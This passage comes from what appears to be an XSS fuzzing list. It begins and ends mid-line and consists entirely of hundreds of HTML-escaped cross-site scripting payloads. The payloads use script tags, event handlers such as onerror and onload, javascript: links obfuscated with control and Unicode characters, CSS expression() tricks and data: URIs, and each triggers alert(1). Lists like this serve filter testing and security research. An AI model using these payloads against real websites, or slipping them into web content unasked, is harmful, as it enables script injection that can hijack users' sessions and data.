Me&lt;/a&gt;\n&lt;script\\x20type=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x3Etype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x0Dtype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x09type=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x0Ctype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x2Ftype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x0Atype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n'`\"&gt;&lt;\\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;        \n'`\"&gt;&lt;\\x00script&gt;javascript:alert(1)&lt;/script&gt;\n&lt;img src=1 href=1 onerror=\"javascript:alert(1)\"&gt;&lt;/img&gt;\n&lt;audio src=1 href=1 onerror=\"javascript:alert(1)\"&gt;&lt;/audio&gt;\n&lt;video src=1 href=1 onerror=\"javascript:alert(1)\"&gt;&lt;/video&gt;\n&lt;body src=1 href=1 onerror=\"javascript:alert(1)\"&gt;&lt;/body&gt;\n&lt;image src=1 href=1 onerror=\"javascript:alert(1)\"&gt;&lt;/image&gt;\n&lt;object src=1 href=1 onerror=\"javascript:alert(1)\"&gt;&lt;/object&gt;\n&lt;script src=1 href=1 onerror=\"javascript:alert(1)\"&gt;&lt;/script&gt;\n&lt;svg onResize svg onResize=\"javascript:javascript:alert(1)\"&gt;&lt;/svg onResize&gt;\n&lt;title onPropertyChange title onPropertyChange=\"javascript:javascript:alert(1)\"&gt;&lt;/title onPropertyChange&gt;\n&lt;iframe onLoad iframe onLoad=\"javascript:javascript:alert(1)\"&gt;&lt;/iframe onLoad&gt;\n&lt;body onMouseEnter body onMouseEnter=\"javascript:javascript:alert(1)\"&gt;&lt;/body onMouseEnter&gt;\n&lt;body onFocus body onFocus=\"javascript:javascript:alert(1)\"&gt;&lt;/body onFocus&gt;\n&lt;frameset onScroll frameset onScroll=\"javascript:javascript:alert(1)\"&gt;&lt;/frameset onScroll&gt;\n&lt;script onReadyStateChange script onReadyStateChange=\"javascript:javascript:alert(1)\"&gt;&lt;/script onReadyStateChange&gt;\n&lt;html onMouseUp html onMouseUp=\"javascript:javascript:alert(1)\"&gt;&lt;/html onMouseUp&gt;\n&lt;body onPropertyChange body onPropertyChange=\"javascript:javascript:alert(1)\"&gt;&lt;/body onPropertyChange&gt;\n&lt;svg onLoad svg onLoad=\"javascript:javascript:alert(1)\"&gt;&lt;/svg onLoad&gt;\n&lt;body onPageHide body onPageHide=\"javascript:javascript:alert(1)\"&gt;&lt;/body onPageHide&gt;\n&lt;body onMouseOver body onMouseOver=\"javascript:javascript:alert(1)\"&gt;&lt;/body onMouseOver&gt;\n&lt;body onUnload body onUnload=\"javascript:javascript:alert(1)\"&gt;&lt;/body onUnload&gt;\n&lt;body onLoad body onLoad=\"javascript:javascript:alert(1)\"&gt;&lt;/body onLoad&gt;\n&lt;bgsound onPropertyChange bgsound onPropertyChange=\"javascript:javascript:alert(1)\"&gt;&lt;/bgsound onPropertyChange&gt;\n&lt;html onMouseLeave html onMouseLeave=\"javascript:javascript:alert(1)\"&gt;&lt;/html onMouseLeave&gt;\n&lt;html onMouseWheel html onMouseWheel=\"javascript:javascript:alert(1)\"&gt;&lt;/html onMouseWheel&gt;\n&lt;style onLoad style onLoad=\"javascript:javascript:alert(1)\"&gt;&lt;/style onLoad&gt;\n&lt;iframe onReadyStateChange iframe onReadyStateChange=\"javascript:javascript:alert(1)\"&gt;&lt;/iframe onReadyStateChange&gt;\n&lt;body onPageShow body onPageShow=\"javascript:javascript:alert(1)\"&gt;&lt;/body onPageShow&gt;\n&lt;style onReadyStateChange style onReadyStateChange=\"javascript:javascript:alert(1)\"&gt;&lt;/style onReadyStateChange&gt;\n&lt;frameset onFocus frameset onFocus=\"javascript:javascript:alert(1)\"&gt;&lt;/frameset onFocus&gt;\n&lt;applet onError applet onError=\"javascript:javascript:alert(1)\"&gt;&lt;/applet onError&gt;\n&lt;marquee onStart marquee onStart=\"javascript:javascript:alert(1)\"&gt;&lt;/marquee onStart&gt;\n&lt;script onLoad script onLoad=\"javascript:javascript:alert(1)\"&gt;&lt;/script onLoad&gt;\n&lt;html onMouseOver html onMouseOver=\"javascript:javascript:alert(1)\"&gt;&lt;/html onMouseOver&gt;\n&lt;html onMouseEnter html onMouseEnter=\"javascript:parent.javascript:alert(1)\"&gt;&lt;/html onMouseEnter&gt;\n&lt;body onBeforeUnload body onBeforeUnload=\"javascript:javascript:alert(1)\"&gt;&lt;/body onBeforeUnload&gt;\n&lt;html onMouseDown html onMouseDown=\"javascript:javascript:alert(1)\"&gt;&lt;/html onMouseDown&gt;\n&lt;marquee onScroll marquee onScroll=\"javascript:javascript:alert(1)\"&gt;&lt;/marquee onScroll&gt;\n&lt;xml onPropertyChange xml onPropertyChange=\"javascript:javascript:alert(1)\"&gt;&lt;/xml onPropertyChange&gt;\n&lt;frameset onBlur frameset onBlur=\"javascript:javascript:alert(1)\"&gt;&lt;/frameset onBlur&gt;\n&lt;applet onReadyStateChange applet onReadyStateChange=\"javascript:javascript:alert(1)\"&gt;&lt;/applet onReadyStateChange&gt;\n&lt;svg onUnload svg onUnload=\"javascript:javascript:alert(1)\"&gt;&lt;/svg onUnload&gt;\n&lt;html onMouseOut html onMouseOut=\"javascript:javascript:alert(1)\"&gt;&lt;/html onMouseOut&gt;\n&lt;body onMouseMove body onMouseMove=\"javascript:javascript:alert(1)\"&gt;&lt;/body onMouseMove&gt;\n&lt;body onResize body onResize=\"javascript:javascript:alert(1)\"&gt;&lt;/body onResize&gt;\n&lt;object onError object onError=\"javascript:javascript:alert(1)\"&gt;&lt;/object onError&gt;\n&lt;body onPopState body onPopState=\"javascript:javascript:alert(1)\"&gt;&lt;/body onPopState&gt;\n&lt;html onMouseMove html onMouseMove=\"javascript:javascript:alert(1)\"&gt;&lt;/html onMouseMove&gt;\n&lt;applet onreadystatechange applet onreadystatechange=\"javascript:javascript:alert(1)\"&gt;&lt;/applet onreadystatechange&gt;\n&lt;body onpagehide body onpagehide=\"javascript:javascript:alert(1)\"&gt;&lt;/body onpagehide&gt;\n&lt;svg onunload svg onunload=\"javascript:javascript:alert(1)\"&gt;&lt;/svg onunload&gt;\n&lt;applet onerror applet onerror=\"javascript:javascript:alert(1)\"&gt;&lt;/applet onerror&gt;\n&lt;body onkeyup body onkeyup=\"javascript:javascript:alert(1)\"&gt;&lt;/body onkeyup&gt;\n&lt;body onunload body onunload=\"javascript:javascript:alert(1)\"&gt;&lt;/body onunload&gt;\n&lt;iframe onload iframe onload=\"javascript:javascript:alert(1)\"&gt;&lt;/iframe onload&gt;\n&lt;body onload body onload=\"javascript:javascript:alert(1)\"&gt;&lt;/body onload&gt;\n&lt;html onmouseover html onmouseover=\"javascript:javascript:alert(1)\"&gt;&lt;/html onmouseover&gt;\n&lt;object onbeforeload object onbeforeload=\"javascript:javascript:alert(1)\"&gt;&lt;/object onbeforeload&gt;\n&lt;body onbeforeunload body onbeforeunload=\"javascript:javascript:alert(1)\"&gt;&lt;/body onbeforeunload&gt;\n&lt;body onfocus body onfocus=\"javascript:javascript:alert(1)\"&gt;&lt;/body onfocus&gt;\n&lt;body onkeydown body onkeydown=\"javascript:javascript:alert(1)\"&gt;&lt;/body onkeydown&gt;\n&lt;iframe onbeforeload iframe onbeforeload=\"javascript:javascript:alert(1)\"&gt;&lt;/iframe onbeforeload&gt;\n&lt;iframe src iframe src=\"javascript:javascript:alert(1)\"&gt;&lt;/iframe src&gt;\n&lt;svg onload svg onload=\"javascript:javascript:alert(1)\"&gt;&lt;/svg onload&gt;\n&lt;html onmousemove html onmousemove=\"javascript:javascript:alert(1)\"&gt;&lt;/html onmousemove&gt;\n&lt;body onblur body onblur=\"javascript:javascript:alert(1)\"&gt;&lt;/body onblur&gt;\n\\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;\n'\"`&gt;&lt;script&gt;/* *\\x2Fjavascript:alert(1)// */&lt;/script&gt;\n&lt;script&gt;javascript:alert(1)&lt;/script\\x0D\n&lt;script&gt;javascript:alert(1)&lt;/script\\x0A\n&lt;script&gt;javascript:alert(1)&lt;/script\\x0B\n&lt;script charset=\"\\x22&gt;javascript:alert(1)&lt;/script&gt;\n&lt;!--\\x3E&lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;\n--&gt;&lt;!-- ---&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;\n--&gt;&lt;!-- --\\x00&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;\n--&gt;&lt;!-- --\\x21&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;\n--&gt;&lt;!-- --\\x3E&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;\n`\"'&gt;&lt;img src='#\\x27 onerror=javascript:alert(1)&gt;\n&lt;a href=\"javascript\\x3Ajavascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n\"'`&gt;&lt;p&gt;&lt;svg&gt;&lt;script&gt;a='hello\\x27;javascript:alert(1)//';&lt;/script&gt;&lt;/p&gt;\n&lt;a href=\"javas\\x00cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x07cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x0Dcript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x0Acript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x08cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x02cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x03cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x04cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x01cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x05cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x0Bcript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x09cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x06cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x0Ccript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;script&gt;/* *\\x2A/javascript:alert(1)// */&lt;/script&gt;\n&lt;script&gt;/* *\\x00/javascript:alert(1)// */&lt;/script&gt;\n&lt;style&gt;&lt;/style\\x3E&lt;img src=\"about:blank\" onerror=javascript:alert(1)//&gt;&lt;/style&gt;\n&lt;style&gt;&lt;/style\\x0D&lt;img src=\"about:blank\" onerror=javascript:alert(1)//&gt;&lt;/style&gt;\n&lt;style&gt;&lt;/style\\x09&lt;img src=\"about:blank\" onerror=javascript:alert(1)//&gt;&lt;/style&gt;\n&lt;style&gt;&lt;/style\\x20&lt;img src=\"about:blank\" onerror=javascript:alert(1)//&gt;&lt;/style&gt;\n&lt;style&gt;&lt;/style\\x0A&lt;img src=\"about:blank\" onerror=javascript:alert(1)//&gt;&lt;/style&gt;\n\"'`&gt;ABC&lt;div style=\"font-family:'foo'\\x7Dx:expression(javascript:alert(1);/*';\"&gt;DEF \n\"'`&gt;ABC&lt;div style=\"font-family:'foo'\\x3Bx:expression(javascript:alert(1);/*';\"&gt;DEF \n&lt;script&gt;if(\"x\\\\xE1\\x96\\x89\".length==2) { javascript:alert(1);}&lt;/script&gt;\n&lt;script&gt;if(\"x\\\\xE0\\xB9\\x92\".length==2) { javascript:alert(1);}&lt;/script&gt;\n&lt;script&gt;if(\"x\\\\xEE\\xA9\\x93\".length==2) { javascript:alert(1);}&lt;/script&gt;\n'`\"&gt;&lt;\\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;\n'`\"&gt;&lt;\\x00script&gt;javascript:alert(1)&lt;/script&gt;\n\"'`&gt;&lt;\\x3Cimg src=xxx:x onerror=javascript:alert(1)&gt;\n\"'`&gt;&lt;\\x00img src=xxx:x onerror=javascript:alert(1)&gt;\n&lt;script src=\"data:text/plain\\x2Cjavascript:alert(1)\"&gt;&lt;/script&gt;\n&lt;script src=\"data:\\xD4\\x8F,javascript:alert(1)\"&gt;&lt;/script&gt;\n&lt;script src=\"data:\\xE0\\xA4\\x98,javascript:alert(1)\"&gt;&lt;/script&gt;\n&lt;script src=\"data:\\xCB\\x8F,javascript:alert(1)\"&gt;&lt;/script&gt;\n&lt;script\\x20type=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x3Etype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x0Dtype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x09type=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x0Ctype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x2Ftype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x0Atype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\nABC&lt;div style=\"x\\x3Aexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:expression\\x5C(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:expression\\x00(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:exp\\x00ression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:exp\\x5Cression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\x0Aexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\x09expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\x0Dexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\x0Cexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\x20expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\x00expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\x0Bexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\"&gt;DEF\n&lt;a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n`\"'&gt;&lt;img src=xxx:x \\x0Aonerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x22onerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x0Bonerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x0Donerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x2Fonerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x09onerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x0Conerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x00onerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x27onerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x20onerror=javascript:alert(1)&gt;\n\"`'&gt;&lt;script&gt;\\x3Bjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x0Djavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xEF\\xBB\\xBFjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x81javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x84javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE3\\x80\\x80javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x09javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x89javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x85javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x88javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x00javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\xA8javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x8Ajavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE1\\x9A\\x80javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x0Cjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x2Bjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xF0\\x90\\x96\\x9Ajavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;-javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x0Ajavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\xAFjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x7Ejavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x87javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x81\\x9Fjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\xA9javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xC2\\x85javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xEF\\xBF\\xAEjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x83javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x8Bjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xEF\\xBF\\xBEjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x80javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x21javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x82javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x86javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE1\\xA0\\x8Ejavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x0Bjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x20javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xC2\\xA0javascript:alert(1)&lt;/script&gt;\n\"/&gt;&lt;img/onerror=\\x0Bjavascript:alert(1)\\x0Bsrc=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x22javascript:alert(1)\\x22src=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x09javascript:alert(1)\\x09src=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x27javascript:alert(1)\\x27src=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x0Ajavascript:alert(1)\\x0Asrc=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x0Cjavascript:alert(1)\\x0Csrc=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x0Djavascript:alert(1)\\x0Dsrc=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x60javascript:alert(1)\\x60src=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x20javascript:alert(1)\\x20src=xxx:x /&gt;\n&lt;script\\x2F&gt;javascript:alert(1)&lt;/script&gt;\n&lt;script\\x20&gt;javascript:alert(1)&lt;/script&gt;\n&lt;script\\x0D&gt;javascript:alert(1)&lt;/script&gt;\n&lt;script\\x0A&gt;javascript:alert(1)&lt;/script&gt;\n&lt;script\\x0C&gt;javascript:alert(1)&lt;/script&gt;\n&lt;script\\x00&gt;javascript:alert(1)&lt;/script&gt;\n&lt;script\\x09&gt;javascript:alert(1)&lt;/script&gt;\n\"&gt;&lt;img src=x onerror=javascript:alert(1)&gt;\n\"&gt;&lt;img src=x onerror=javascript:alert('1')&gt;\n\"&gt;&lt;img src=x onerror=javascript:alert(\"1\")&gt;\n\"&gt;&lt;img src=x onerror=javascript:alert(`1`)&gt;\n\"&gt;&lt;img src=x onerror=javascript:alert(('1'))&gt;\n\"&gt;&lt;img src=x onerror=javascript:alert((\"1\"))&gt;\n\"&gt;&lt;img src=x onerror=javascript:alert((`1`))&gt;\n\"&gt;&lt;img src=x onerror=javascript:alert(A)&gt;\n\"&gt;&lt;img src=x onerror=javascript:alert((A))&gt;\n\"&gt;&lt;img src=x 